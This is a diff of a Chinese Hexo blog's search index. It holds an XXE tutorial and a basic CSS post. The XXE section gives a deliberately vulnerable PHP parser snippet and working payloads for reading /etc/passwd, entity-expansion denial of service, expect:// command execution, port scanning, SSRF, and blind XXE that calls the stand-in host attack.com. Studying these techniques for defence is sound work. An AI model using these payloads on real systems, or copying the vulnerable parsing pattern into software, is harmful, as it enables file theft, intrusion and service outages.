-<h2 id="XML外部实体注入-XXE"><a href="#XML外部实体注入-XXE" class="headerlink" title="XML外部实体注入(XXE)"></a>XML外部实体注入(XXE)</h2><h3 id="XXE漏洞简介"><a href="#XXE漏洞简介" class="headerlink" title="XXE漏洞简介"></a>XXE漏洞简介</h3><p>XXE漏洞全称XML External Entity Injection 即XML外部实体注入。<br>XXE漏洞发生在应用程序解析XML输入时，没有禁止外部实体的加载，导致可加载恶意外部文件和代码，造成<strong>任意文件读取、命令执行、内网端口扫描、攻击内网网站、发起Dos攻击</strong>等危害。<br>XXE漏洞触发的点往往是可以上传xml文件的位置，没有对上传的xml文件进行过滤，导致可上传恶意xml文件。</p>
-<p>解析xml在php库libxml，libxml&gt;&#x3D;2.9.0的版本中没有XXE漏洞</p>
-<h3 id="XXE常见利用方式"><a href="#XXE常见利用方式" class="headerlink" title="XXE常见利用方式"></a>XXE常见利用方式</h3><p>与SQL相似，XXE漏洞也分为有回显和无回显<br>有回显，可以直接在页面中看到payload的执行结果或现象。<br>无回显，又称为blind xxe，可以使用外带数据(OOB)通道提取数据。即可以引用远程服务器上的XML文件读取文件。</p>
-<h4 id="读取任意文件"><a href="#读取任意文件" class="headerlink" title="读取任意文件"></a>读取任意文件</h4><p>首先准备一个有XXE漏洞的文件，这里以php文件为例<br>示例代码</p>
-<pre><code class="highlight plaintext">&lt;?php
-$xml = simplexml_load_string($_REQUEST[&#x27;xml&#x27;]);
-print_r($xml);//注释掉该语句即为无回显的情况
-?&gt;</code></pre>
-
-<p>构造payload</p>
-<pre><code class="highlight plaintext">&lt;?xml version=&quot;1.0&quot; encoding=&quot;utf-8&quot;?&gt;
-&lt;!DOCTYPE xxe [
-&lt;!ELEMENT name ANY &gt;
-&lt;!ENTITY file SYSTEM &quot;file:///d://qwzf.txt&quot; &gt;
-]&gt;
-&lt;root&gt;
-&lt;name&gt;&amp;file;&lt;/name&gt;
-&lt;/root&gt;
-或者
-&lt;?xml version=&quot;1.0&quot;?&gt;
-&lt;!DOCTYPE data [
-&lt;!ELEMENT data (#ANY)&gt;
-&lt;!ENTITY file SYSTEM &quot;file:///etc/passwd&quot;&gt;
-]&gt;
-&lt;data&gt;&amp;file;&lt;/data&gt;</code></pre>
-
-<p>如果搭配vps弹shell的话需要在自己的VPS上写一个dtd</p>
-<pre><code class="highlight plaintext"></code></pre>
-
-
-
-<h4 id="拒绝服务攻击"><a href="#拒绝服务攻击" class="headerlink" title="拒绝服务攻击"></a>拒绝服务攻击</h4><pre><code class="highlight plaintext">&lt;!DOCTYPE data [
-&lt;!ELEMENT data (#ANY)&gt;
-&lt;!ENTITY a0 &quot;dos&quot; &gt;
-&lt;!ENTITY a1 &quot;&amp;a0;&amp;a0;&amp;a0;&amp;a0;&amp;a0;&quot;&gt;
-&lt;!ENTITY a2 &quot;&amp;a1;&amp;a1;&amp;a1;&amp;a1;&amp;a1;&quot;&gt;
-]&gt;
-&lt;data&gt;&amp;a2;&lt;/data&gt;</code></pre>
-
-<p>若解析过程非常缓慢，则表示测试成功，目标站点可能有拒绝服务漏洞。 具体攻击可使用更多层的迭代或递归，也可引用巨大的外部实体，以实现攻击的效果。</p>
-<p>大概的逻辑就是通过嵌套占用服务器的资源，来造成服务器的服务崩溃</p>
-<h4 id="RCE"><a href="#RCE" class="headerlink" title="RCE"></a>RCE</h4><pre><code class="highlight plaintext">&lt;?xml version = &quot;1.0&quot;?&gt;
-&lt;!DOCTYPE ANY [
-		&lt;!ENTITY xxe SYSTEM &quot;expect://id&quot;&gt;
-]&gt;
-&lt;x&gt;&amp;xxe;&lt;/x&gt;</code></pre>
-
-<h4 id="端口扫描"><a href="#端口扫描" class="headerlink" title="端口扫描"></a>端口扫描</h4><pre><code class="highlight plaintext">&lt;?xml version=&quot;1.0&quot; encoding=&quot;utf-8&quot;?&gt; 
-&lt;!DOCTYPE xxe [
-&lt;!ELEMENT name ANY &gt;
-&lt;!ENTITY xxe SYSTEM &quot;http://127.0.0.1:8080“&gt;]&gt;
-&lt;root&gt;
-&lt;name&gt;&amp;xxe;&lt;/name&gt;
-&lt;/root&gt;</code></pre>
-
-<h4 id="盲注"><a href="#盲注" class="headerlink" title="盲注"></a>盲注</h4><pre><code class="highlight plaintext">&lt;?xml version=&quot;1.0&quot; encoding=&quot;utf-8&quot;?&gt; 
-&lt;!DOCTYPE xxe [
-&lt;!ELEMENT name ANY &gt;
-&lt;!ENTITY xxe SYSTEM &quot;http://attack.com/1.dto“&gt;]&gt;
-&lt;root&gt;
-&lt;name&gt;&amp;xxe;&lt;/name&gt;
-&lt;/root&gt;</code></pre>
-
-<h4 id="SSRF"><a href="#SSRF" class="headerlink" title="SSRF"></a>SSRF</h4><pre><code class="highlight plaintext">&lt;?xml version=&quot;1.0&quot;?&gt;
-&lt;!DOCTYPE data SYSTEM &quot;http://publicServer.com/&quot; [
-&lt;!ELEMENT data (#ANY)&gt;
-]&gt;
-&lt;data&gt;4&lt;/data&gt;</code></pre>
-
-<h4 id="X-Include"><a href="#X-Include" class="headerlink" title="X-Include"></a>X-Include</h4><pre><code class="highlight plaintext">&lt;?xml version=&#x27;1.0&#x27;?&gt;
-&lt;data xmlns:xi=&quot;http://www.w3.org/2001/XInclude&quot;&gt;&lt;xi:include href=&quot;http://publicServer.com/file.xml&quot;&gt;&lt;/xi:include&gt;&lt;/data&gt;</code></pre>
-
-
-
-]]></content>
-      <tags>
-        <tag>-Web</tag>
       </tags>
   </entry>
   <entry>
@@ -5621,6 +5420,207 @@ usleep函数：延迟执行当前脚本数微秒，即条件竞争</code></pre>
 ]]></content>
       <tags>
         <tag>-Web -CTF -WriteUp</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>初见XXE</title>
+    <url>/2025/04/28/%E5%88%9D%E8%A7%81XXE/</url>
+    <content><![CDATA[<h1 id="初见XXE"><a href="#初见XXE" class="headerlink" title="初见XXE"></a>初见XXE</h1><p>这是什么?XXE，注一下。这是什么?XXE，注一下。这是什么?XXE，注一下。这是什么?XXE，注一下。这是什么?XXE，注一下。这是什么?XXE，注一下。这是什么?XXE，注一下。这是什么?XXE，注一下。这是什么?XXE，注一下。这是什么?XXE，注一下。</p>
+<h2 id="什么是XML呢"><a href="#什么是XML呢" class="headerlink" title="什么是XML呢"></a>什么是XML呢</h2><p>XML，全称<strong>可扩展标记语言</strong>，XML是一种用于存储和传输数据的语言。与HTML一样，XML使用标签和数据的树状结构。但不同的是，XML不使用预定义标记，因此可以为标记指定描述数据的名称。由于json的出现，xml的受欢迎程度大大下降。</p>
+<p>XML文档结构包括XML声明+DTD文档类型定义+文档元素</p>
+<pre><code class="highlight plaintext">&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot; standalone=&quot;yes&quot;?&gt;&lt;!--xml文件的声明--&gt;
+&lt;bookstore&gt;                                                 &lt;!--根元素--&gt;
+&lt;book category=&quot;COOKING&quot;&gt;        &lt;!--bookstore的子元素，category为属性--&gt;
+&lt;title&gt;Everyday Italian&lt;/title&gt;           &lt;!--book的子元素，lang为属性--&gt;
+&lt;author&gt;Giada De Laurentiis&lt;/author&gt;                  &lt;!--book的子元素--&gt;
+&lt;year&gt;2005&lt;/year&gt;                                     &lt;!--book的子元素--&gt;
+&lt;price&gt;30.00&lt;/price&gt;                                  &lt;!--book的子元素--&gt;
+&lt;/book&gt;                                                 &lt;!--book的结束--&gt;
+&lt;/bookstore&gt;                                       &lt;!--bookstore的结束--&gt;</code></pre>
+
+<p>其中<code>&lt;note&gt;</code>是根元素，每个XML文档必须包含一个根元素。</p>
+<p><code>&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot; standalone=&quot;yes&quot;?&gt;</code> 称为 XML prolog ，用于声明XML文档的版本和编码，是可选的，必须放在文档开头。</p>
+<p>standalone值是yes的时候表示DTD仅用于验证文档结构，从而外部实体将被禁用，但它的默认值是no，而且有些parser会直接忽略这一项。</p>
+<h3 id="DTD"><a href="#DTD" class="headerlink" title="DTD"></a>DTD</h3><p><strong>DTD基本概念</strong><br>XML 文档有自己的一个格式规范，这个格式规范是由一个叫做 DTD（document type definition） 的东西控制的。<br>DTD用来为XML文档定义语义约束。可以嵌入在XML文档中(内部声明)，也可以独立的放在另外一个单独的文件中(外部引用)。是XML文档中的几条语句，用来说明哪些元素&#x2F;属性是合法的以及元素间应当怎样嵌套&#x2F;结合，也用来将一些特殊字符和可复用代码段自定义为实体。<br><strong>实体引用</strong><br>XML元素以形如 <code>&lt;tag&gt;foo&lt;/tag&gt;</code> 的标签开始和结束，如果元素内部出现如<code>&lt;</code> 的特殊字符，解析就会失败，为了避免这种情况，XML用实体引用（entity reference）替换特殊字符。XML预定义五个实体引用，即用<code>&lt; &gt; &amp; &#39; &quot;</code> 替换 <code>&lt; &gt; &amp; &#39; &quot;</code> 。<br>实体引用可以起到类似宏定义和文件包含的效果，为了方便，我们会希望自定义实体引用，这个操作在称为 Document Type Defination（DTD，文档类型定义）的过程中进行。<br><strong>dtd的引入方式</strong><br>DTD（文档类型定义）的作用是定义 XML 文档的合法构建模块。DTD 可以在 XML 文档内声明，也可以外部引用。<br><em>内部 DTD</em><br>使用内部的dtd文件，即将约束规则定义在xml文档中</p>
+<pre><code class="highlight plaintext">&lt;!DOCTYPE 根元素名称 [元素声明]&gt;</code></pre>
+
+<p>示例代码：</p>
+<pre><code class="highlight plaintext">&lt;?xml version=&quot;1.0&quot;?&gt;
+&lt;!DOCTYPE note [&lt;!--定义此文档是 note 类型的文档--&gt;
+&lt;!ELEMENT note (to,from,heading,body)&gt;&lt;!--定义note元素有四个元素--&gt;
+&lt;!ELEMENT to (#PCDATA)&gt;&lt;!--定义to元素为”#PCDATA”类型--&gt;
+&lt;!ELEMENT from (#PCDATA)&gt;&lt;!--定义from元素为”#PCDATA”类型--&gt;
+&lt;!ELEMENT head (#PCDATA)&gt;&lt;!--定义head元素为”#PCDATA”类型--&gt;
+&lt;!ELEMENT body (#PCDATA)&gt;&lt;!--定义body元素为”#PCDATA”类型--&gt;
+]&gt;
+&lt;note&gt;
+&lt;to&gt;Y0u&lt;/to&gt;
+&lt;from&gt;@re&lt;/from&gt;
+&lt;head&gt;v3ry&lt;/head&gt;
+&lt;body&gt;g00d!&lt;/body&gt;
+&lt;/note&gt;</code></pre>
+
+<p><em>外部 DTD</em><br>（1）引入外部的dtd文件</p>
+<pre><code class="highlight plaintext">&lt;!DOCTYPE 根元素名称 SYSTEM &quot;dtd路径&quot;&gt;</code></pre>
+
+<p>（2）使用外部的dtd文件(网络上的dtd文件)</p>
+<pre><code class="highlight plaintext">&lt;!DOCTYPE 根元素 PUBLIC &quot;DTD名称&quot; &quot;DTD文档的URL&quot;&gt;</code></pre>
+
+<p>当使用外部DTD时，通过如下语法引入：</p>
+<pre><code class="highlight plaintext">&lt;!DOCTYPE root-element SYSTEM &quot;filename&quot;&gt;</code></pre>
+
+<p>示例代码：</p>
+<pre><code class="highlight plaintext">&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;
+&lt;!DOCTYPE root-element SYSTEM &quot;test.dtd&quot;&gt;
+&lt;note&gt;
+&lt;to&gt;Y0u&lt;/to&gt;
+&lt;from&gt;@re&lt;/from&gt;
+&lt;head&gt;v3ry&lt;/head&gt;
+&lt;body&gt;g00d!&lt;/body&gt;
+&lt;/note&gt;</code></pre>
+
+<p>test.dtd</p>
+<pre><code class="highlight plaintext">&lt;!ELEMENT to (#PCDATA)&gt;&lt;!--定义to元素为”#PCDATA”类型--&gt;
+&lt;!ELEMENT from (#PCDATA)&gt;&lt;!--定义from元素为”#PCDATA”类型--&gt;
+&lt;!ELEMENT head (#PCDATA)&gt;&lt;!--定义head元素为”#PCDATA”类型--&gt;
+&lt;!ELEMENT body (#PCDATA)&gt;&lt;!--定义body元素为”#PCDATA”类型--&gt;</code></pre>
+
+<p><strong>PCDATA</strong><br>PCDATA的意思是被解析的字符数据。PCDATA是会被解析器解析的文本。这些文本将被解析器检查实体以及标记。文本中的标签会被当作标记来处理，而实体会被展开。<br>被解析的字符数据不应当包含任何<code>&amp;</code>，<code>&lt;</code>，或者<code>&gt;</code>字符，需要用<code>&amp;</code> <code>&lt;</code> <code>&gt;</code>实体来分别替换。<br><strong>CDATA</strong><br>CDATA意思是字符数据，CDATA 是不会被解析器解析的文本，在这些文本中的标签不会被当作标记来对待，其中的实体也不会被展开。<br><strong>DTD元素</strong><br><img src="https://kisakiayano.oss-cn-hangzhou.aliyuncs.com/img/20191202150727-65e7882a-14d2-1.png" alt="img"><br><strong>DTD属性</strong><br><strong>属性声明语法</strong>：</p>
+<pre><code class="highlight plaintext">&lt;!ATTLIST 元素名称 属性名称 属性类型 默认值&gt;</code></pre>
+
+<p>DTD实例：</p>
+<pre><code class="highlight plaintext">&lt;!ATTLIST payment Luckey CDATA &quot;Q&quot;&gt;</code></pre>
+
+<p>XML实例：</p>
+<pre><code class="highlight plaintext">&lt;payment Luckey=&quot;Q&quot; /&gt;</code></pre>
+
+<p>以下是 属性类型的选项</p>
+<p><img src="https://kisakiayano.oss-cn-hangzhou.aliyuncs.com/img/20191202150821-85ef2e3e-14d2-1.png" alt="20191202150821-85ef2e3e-14d2-1"></p>
+<p>默认属性值可使用下列值：</p>
+<p><img src="https://kisakiayano.oss-cn-hangzhou.aliyuncs.com/img/20191202150849-96eb9a7e-14d2-1.png" alt="20191202150849-96eb9a7e-14d2-1"></p>
+<p><strong>DTD实体</strong></p>
+<blockquote>
+<p>实体是用于定义引用普通文本或特殊字符的快捷方式的变量。<br>实体引用是对实体的引用。<br>实体可在内部或外部进行声明。</p>
+</blockquote>
+<p><em>按实体有无参分类，实体分为一般实体和参数实体</em><br><em>一般实体的声明</em>：<code>&lt;!ENTITY 实体名称 &quot;实体内容&quot;&gt;</code><br>引用一般实体的方法：<code>&amp;实体名称;</code><br>ps：经实验，普通实体可以在DTD中引用，可以在XML中引用，可以在声明前引用，还可以在实体声明内部引用。</p>
+<p><em>参数实体的声明</em>：<code>&lt;!ENTITY % 实体名称 &quot;实体内容&quot;&gt;</code><br>引用参数实体的方法：<code>%实体名称;</code><br>ps：经实验，参数实体只能在DTD中引用，不能在声明前引用，也不能在实体声明内部引用。<br>DTD实体是用于定义引用普通文本或特殊字符的快捷方式的变量，可以内部声明或外部引用。</p>
+<p><em>按实体使用方式分类，实体分为内部声明实体和引用外部实体</em><br><em>内部实体</em></p>
+<pre><code class="highlight plaintext">&lt;!ENTITY 实体名称 &quot;实体的值&quot;&gt;</code></pre>
+
+<p>内部实体示例代码：</p>
+<pre><code class="highlight plaintext">&lt;?xml version = &quot;1.0&quot; encoding = &quot;utf-8&quot;?&gt;
+&lt;!DOCTYPE test [
+    &lt;!ENTITY writer &quot;Dawn&quot;&gt;
+    &lt;!ENTITY copyright &quot;Copyright W3School.com.cn&quot;&gt;
+]&gt;
+&lt;test&gt;&amp;writer;©right;&lt;/test&gt;</code></pre>
+
+<p><em>外部实体</em><br>外部实体，用来引入外部资源。有<code>SYSTEM</code>和<code>PUBLIC</code>两个关键字，表示实体来自本地计算机还是公共计算机。</p>
+<pre><code class="highlight plaintext">&lt;!ENTITY 实体名称 SYSTEM &quot;URI/URL&quot;&gt;
+或者
+&lt;!ENTITY 实体名称 PUBLIC &quot;public_ID&quot; &quot;URI&quot;&gt;</code></pre>
+
+<p>外部实体示例代码：</p>
+<pre><code class="highlight plaintext">&lt;?xml version = &quot;1.0&quot; encoding = &quot;utf-8&quot;?&gt;
+&lt;!DOCTYPE test [
+    &lt;!ENTITY file SYSTEM &quot;file:///etc/passwd&quot;&gt;
+    &lt;!ENTITY copyright SYSTEM &quot;http://www.w3school.com.cn/dtd/entities.dtd&quot;&gt;
+]&gt;
+&lt;author&gt;&amp;file;©right;&lt;/author&gt;</code></pre>
+
+<p>外部实体可支持http、file等协议。不同程序支持的协议不同：<br><img src="https://xzfile.aliyuncs.com/media/upload/picture/20191202150935-b26e4a30-14d2-1.png" alt="img"><br>PHP支持的协议会更多一些，但需要一定的扩展：<br><img src="https://xzfile.aliyuncs.com/media/upload/picture/20191202151023-cf02c3ba-14d2-1.png" alt="img"><br>PHP引用外部实体，<strong>常见的利用协议</strong>：</p>
+<pre><code class="highlight plaintext">file://文件绝对路径 如：file:///etc/passwd
+http://url/file.txt
+php://filter/read=convert.base64-encode/resource=xxx.php</code></pre>
+
+<p><em>参数实体+外部实体</em></p>
+<pre><code class="highlight plaintext">&lt;!ENTITY % 实体名称 SYSTEM &quot;URI/URL&quot;&gt;</code></pre>
+
+<p>参数实体+外部实体示例代码：</p>
+<pre><code class="highlight plaintext">&lt;?xml version=&quot;1.0&quot; encoding=&quot;utf-8&quot;?&gt;
+&lt;!DOCTYPE test [
+  &lt;!ENTITY % file SYSTEM &quot;file:///etc/passwd&quot;&gt;
+  %file;
+]&gt;</code></pre>
+
+<p><code>%file</code>(参数实体)是在DTD中被引用的，而<code>&amp;file;</code>是在xml文档中被引用的。</p>
+<h2 id="XML外部实体注入-XXE"><a href="#XML外部实体注入-XXE" class="headerlink" title="XML外部实体注入(XXE)"></a>XML外部实体注入(XXE)</h2><h3 id="XXE漏洞简介"><a href="#XXE漏洞简介" class="headerlink" title="XXE漏洞简介"></a>XXE漏洞简介</h3><p>XXE漏洞全称XML External Entity Injection 即XML外部实体注入。<br>XXE漏洞发生在应用程序解析XML输入时，没有禁止外部实体的加载，导致可加载恶意外部文件和代码，造成<strong>任意文件读取、命令执行、内网端口扫描、攻击内网网站、发起Dos攻击</strong>等危害。<br>XXE漏洞触发的点往往是可以上传xml文件的位置，没有对上传的xml文件进行过滤，导致可上传恶意xml文件。</p>
+<p>解析xml在php库libxml，libxml&gt;&#x3D;2.9.0的版本中没有XXE漏洞</p>
+<h3 id="XXE常见利用方式"><a href="#XXE常见利用方式" class="headerlink" title="XXE常见利用方式"></a>XXE常见利用方式</h3><p>与SQL相似，XXE漏洞也分为有回显和无回显<br>有回显，可以直接在页面中看到payload的执行结果或现象。<br>无回显，又称为blind xxe，可以使用外带数据(OOB)通道提取数据。即可以引用远程服务器上的XML文件读取文件。</p>
+<h4 id="读取任意文件"><a href="#读取任意文件" class="headerlink" title="读取任意文件"></a>读取任意文件</h4><p>首先准备一个有XXE漏洞的文件，这里以php文件为例<br>示例代码</p>
+<pre><code class="highlight plaintext">&lt;?php
+$xml = simplexml_load_string($_REQUEST[&#x27;xml&#x27;]);
+print_r($xml);//注释掉该语句即为无回显的情况
+?&gt;</code></pre>
+
+<p>构造payload</p>
+<pre><code class="highlight plaintext">&lt;?xml version=&quot;1.0&quot; encoding=&quot;utf-8&quot;?&gt;
+&lt;!DOCTYPE xxe [
+&lt;!ELEMENT name ANY &gt;
+&lt;!ENTITY file SYSTEM &quot;file:///d://qwzf.txt&quot; &gt;
+]&gt;
+&lt;root&gt;
+&lt;name&gt;&amp;file;&lt;/name&gt;
+&lt;/root&gt;
+或者
+&lt;?xml version=&quot;1.0&quot;?&gt;
+&lt;!DOCTYPE data [
+&lt;!ELEMENT data (#ANY)&gt;
+&lt;!ENTITY file SYSTEM &quot;file:///etc/passwd&quot;&gt;
+]&gt;
+&lt;data&gt;&amp;file;&lt;/data&gt;</code></pre>
+
+<p>如果搭配vps弹shell的话需要在自己的VPS上写一个dtd</p>
+<pre><code class="highlight plaintext"></code></pre>
+
+
+
+<h4 id="拒绝服务攻击"><a href="#拒绝服务攻击" class="headerlink" title="拒绝服务攻击"></a>拒绝服务攻击</h4><pre><code class="highlight plaintext">&lt;!DOCTYPE data [
+&lt;!ELEMENT data (#ANY)&gt;
+&lt;!ENTITY a0 &quot;dos&quot; &gt;
+&lt;!ENTITY a1 &quot;&amp;a0;&amp;a0;&amp;a0;&amp;a0;&amp;a0;&quot;&gt;
+&lt;!ENTITY a2 &quot;&amp;a1;&amp;a1;&amp;a1;&amp;a1;&amp;a1;&quot;&gt;
+]&gt;
+&lt;data&gt;&amp;a2;&lt;/data&gt;</code></pre>
+
+<p>若解析过程非常缓慢，则表示测试成功，目标站点可能有拒绝服务漏洞。 具体攻击可使用更多层的迭代或递归，也可引用巨大的外部实体，以实现攻击的效果。</p>
+<p>大概的逻辑就是通过嵌套占用服务器的资源，来造成服务器的服务崩溃</p>
+<h4 id="RCE"><a href="#RCE" class="headerlink" title="RCE"></a>RCE</h4><pre><code class="highlight plaintext">&lt;?xml version = &quot;1.0&quot;?&gt;
+&lt;!DOCTYPE ANY [
+		&lt;!ENTITY xxe SYSTEM &quot;expect://id&quot;&gt;
+]&gt;
+&lt;x&gt;&amp;xxe;&lt;/x&gt;</code></pre>
+
+<h4 id="端口扫描"><a href="#端口扫描" class="headerlink" title="端口扫描"></a>端口扫描</h4><pre><code class="highlight plaintext">&lt;?xml version=&quot;1.0&quot; encoding=&quot;utf-8&quot;?&gt; 
+&lt;!DOCTYPE xxe [
+&lt;!ELEMENT name ANY &gt;
+&lt;!ENTITY xxe SYSTEM &quot;http://127.0.0.1:8080“&gt;]&gt;
+&lt;root&gt;
+&lt;name&gt;&amp;xxe;&lt;/name&gt;
+&lt;/root&gt;</code></pre>
+
+<h4 id="盲注"><a href="#盲注" class="headerlink" title="盲注"></a>盲注</h4><pre><code class="highlight plaintext">&lt;?xml version=&quot;1.0&quot; encoding=&quot;utf-8&quot;?&gt; 
+&lt;!DOCTYPE xxe [
+&lt;!ELEMENT name ANY &gt;
+&lt;!ENTITY xxe SYSTEM &quot;http://attack.com/1.dto“&gt;]&gt;
+&lt;root&gt;
+&lt;name&gt;&amp;xxe;&lt;/name&gt;
+&lt;/root&gt;</code></pre>
+
+<h4 id="SSRF"><a href="#SSRF" class="headerlink" title="SSRF"></a>SSRF</h4><pre><code class="highlight plaintext">&lt;?xml version=&quot;1.0&quot;?&gt;
+&lt;!DOCTYPE data SYSTEM &quot;http://publicServer.com/&quot; [
+&lt;!ELEMENT data (#ANY)&gt;
+]&gt;
+&lt;data&gt;4&lt;/data&gt;</code></pre>
+
+<h4 id="X-Include"><a href="#X-Include" class="headerlink" title="X-Include"></a>X-Include</h4><pre><code class="highlight plaintext">&lt;?xml version=&#x27;1.0&#x27;?&gt;
+&lt;data xmlns:xi=&quot;http://www.w3.org/2001/XInclude&quot;&gt;&lt;xi:include href=&quot;http://publicServer.com/file.xml&quot;&gt;&lt;/xi:include&gt;&lt;/data&gt;</code></pre>
+
+
+
+]]></content>
+      <tags>
+        <tag>-Web</tag>
       </tags>
   </entry>
   <entry>
@@ -6558,6 +6558,229 @@ conversions = &#123;
       </categories>
       <tags>
         <tag>智能合约</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>深度学习网页前端之CSS</title>
+    <url>/2025/03/30/%E6%B7%B1%E5%BA%A6%E5%AD%A6%E4%B9%A0%E7%BD%91%E9%A1%B5%E5%89%8D%E7%AB%AF%E4%B9%8BCSS/</url>
+    <content><![CDATA[<h1 id="深度学习网页前端之CSS"><a href="#深度学习网页前端之CSS" class="headerlink" title="深度学习网页前端之CSS"></a>深度学习网页前端之CSS</h1><h2 id="写在前面"><a href="#写在前面" class="headerlink" title="写在前面"></a>写在前面</h2><p>你如果问我CSS是什么<del>CSS就是CSS啊</del></p>
+<p>那我可以说，平时浏览网页的主要内容就算由CSS构成的，如果说HTML是骨架，那么CSS就是主要的血肉</p>
+<p>看看菜鸟教程上是怎么解释的:<img src="https://kisakiayano.oss-cn-hangzhou.aliyuncs.com/img/image-20250329160026108.png" alt="image-20250329160026108"></p>
+<h2 id="CSS基础语法"><a href="#CSS基础语法" class="headerlink" title="CSS基础语法"></a>CSS基础语法</h2><p>CSS由两个主要的部分构成:</p>
+<ul>
+<li>选择器 &#x2F;&#x2F;需要改变样式的HTML元素</li>
+<li>一条或多条说明 &#x2F;&#x2F;每给说明&#x3D;1个属性+1个值</li>
+</ul>
+<p>每个属性有一个值。属性和值被冒号分开</p>
+<p>一般都放在head部分的style里</p>
+<p>大概长这个样子</p>
+<p><img src="https://kisakiayano.oss-cn-hangzhou.aliyuncs.com/img/image-20250329160327242.png" alt="image-20250329160327242"></p>
+<p>css的注释使用经典的&#x2F;* *&#x2F;</p>
+<h2 id="对于多模块的处理"><a href="#对于多模块的处理" class="headerlink" title="对于多模块的处理"></a>对于多模块的处理</h2><p>用过F12的都知道，一个成熟的网页远远不止一种单调的元素，而是能让你眼花缭乱的，这就是通过选择器来进行不同的渲染的</p>
+<h3 id="id-选择器"><a href="#id-选择器" class="headerlink" title="id 选择器"></a>id 选择器</h3><p>在{}前加上<code>#[选择器名字]</code></p>
+<p>在下面要使用这些属性+值的部分的开始标签加上<code>id=&quot;[选择器名字]&quot;</code></p>
+<p>这样就大功告成了</p>
+<blockquote>
+<p>[!IMPORTANT]</p>
+<p>ID属性不要以数字开头，数字开头的ID在 Mozilla&#x2F;Firefox 浏览器中不起作用</p>
+</blockquote>
+<h3 id="class选择器"><a href="#class选择器" class="headerlink" title="class选择器"></a>class选择器</h3><p>class选择器用于描述一组元素的样式，使用经典款前后闭合</p>
+<p>head部分:.</p>
+<pre><code class="highlight css">.<span class="selector-attr">[选择器名字]</span>&#123;
+属性与值
+&#125;</code></pre>
+
+<p>body部分: </p>
+<pre><code class="highlight css">&lt;<span class="selector-tag">div</span> class=&quot;<span class="selector-attr">[选择器名称]</span>&quot;&gt;
+
+&lt;/<span class="selector-tag">div</span>&gt;</code></pre>
+
+<h2 id="CSS的插入"><a href="#CSS的插入" class="headerlink" title="CSS的插入"></a>CSS的插入</h2><p>CSS的插入方式有三种</p>
+<ul>
+<li>外部样式表</li>
+<li>内部样式表</li>
+<li>内联样式</li>
+</ul>
+<h3 id="外部样式表"><a href="#外部样式表" class="headerlink" title="外部样式表"></a>外部样式表</h3><p>就和图片差不多，从服务器的目录下引入样式表</p>
+<pre><code class="highlight html"><span class="comment">&lt;!-- html内 --&gt;</span>
+<span class="tag">&lt;<span class="name">head</span>&gt;</span>
+<span class="tag">&lt;<span class="name">link</span> <span class="attr">rel</span>=<span class="string">&quot;stylesheet&quot;</span> <span class="attr">type</span>=<span class="string">&quot;text/css&quot;</span> <span class="attr">href</span>=<span class="string">&quot;mystyle.css&quot;</span>&gt;</span>
+<span class="tag">&lt;/<span class="name">head</span>&gt;</span></code></pre>
+
+<pre><code class="highlight css"><span class="comment">/*CSS文件内*/</span>
+hr &#123;<span class="attribute">color</span>:sienna;&#125;
+<span class="selector-tag">p</span> &#123;<span class="attribute">margin-left</span>:<span class="number">20px</span>;&#125;
+<span class="selector-tag">body</span> &#123;<span class="attribute">background-image</span>:<span class="built_in">url</span>(<span class="string">&quot;/images/back40.gif&quot;</span>);&#125;</code></pre>
+
+<p>浏览器会从css文件中读取样式声明，并根据声明来格式文档</p>
+<blockquote>
+<p>用作外部表的CSS文件不能包含任何的 html 标签</p>
+</blockquote>
+<p>不要属性值和单位之间留空格:如 <code>margin-left: 20 px</code>应该写为<code>margin-left: 20px</code></p>
+<h3 id="内部样式表"><a href="#内部样式表" class="headerlink" title="内部样式表"></a>内部样式表</h3><p>单个文档需要特殊样式时，就使用内部样式表：</p>
+<pre><code class="highlight html"><span class="tag">&lt;<span class="name">head</span>&gt;</span>
+<span class="tag">&lt;<span class="name">style</span>&gt;</span><span class="language-css"></span>
+<span class="language-css">hr &#123;<span class="attribute">color</span>:sienna;&#125;</span>
+<span class="language-css"><span class="selector-tag">p</span> &#123;<span class="attribute">margin-left</span>:<span class="number">20px</span>;&#125;</span>
+<span class="language-css"><span class="selector-tag">body</span> &#123;<span class="attribute">background-image</span>:<span class="built_in">url</span>(<span class="string">&quot;images/back40.gif&quot;</span>);&#125;</span>
+<span class="language-css"></span><span class="tag">&lt;/<span class="name">style</span>&gt;</span>
+<span class="tag">&lt;/<span class="name">head</span>&gt;</span></code></pre>
+
+<h3 id="内联样式"><a href="#内联样式" class="headerlink" title="内联样式"></a>内联样式</h3><p>由于要将表现和内容混杂在一起，内联样式会损失掉样式表的许多优势。请慎用这种方法，例如当样式仅需要在一个元素上应用一次时。</p>
+<p>要使用内联样式，你需要在相关的标签内使用样式（style）属性。Style 属性可以包含任何 CSS 属性。本例展示如何改变段落的颜色和左外边距：</p>
+<pre><code class="highlight html"><span class="tag">&lt;<span class="name">p</span> <span class="attr">style</span>=<span class="string">&quot;color:sienna;margin-left:20px&quot;</span>&gt;</span>这是一个段落。<span class="tag">&lt;/<span class="name">p</span>&gt;</span></code></pre>
+
+<h3 id="样式的继承"><a href="#样式的继承" class="headerlink" title="样式的继承"></a>样式的继承</h3><p>如果某些属性在不同的样式表中被同样的选择器定义，那么属性值将从更具体的样式表中被继承过来。 </p>
+<p>例如，外部样式表拥有针对 h3 选择器的三个属性：</p>
+<pre><code class="highlight css"><span class="selector-tag">h3</span> &#123;  <span class="attribute">color</span>:red;    <span class="attribute">text-align</span><span class="selector-pseudo">:left</span>;    <span class="attribute">font-size</span>:<span class="number">8pt</span>; &#125;</code></pre>
+
+<p>而内部样式表拥有针对 h3 选择器的两个属性：</p>
+<pre><code class="highlight css"><span class="selector-tag">h3</span> &#123;    <span class="attribute">text-align</span><span class="selector-pseudo">:right</span>;    <span class="attribute">font-size</span>:<span class="number">20pt</span>; &#125;</code></pre>
+
+<p>假如拥有内部样式表的这个页面同时与外部样式表链接，那么 h3 得到的样式是：</p>
+<pre><code class="highlight plaintext">color:red; text-align:right; font-size:20pt;</code></pre>
+
+<p>即颜色属性将被继承于外部样式表，而文字排列（text-alignment）和字体尺寸（font-size）会被内部样式表中的规则取代。</p>
+<hr>
+<p>样式的优先级为:</p>
+<p><strong>（内联样式）Inline style &gt; （内部样式）Internal style sheet &gt;（外部样式）External style sheet &gt; 浏览器默认样式</strong></p>
+<blockquote>
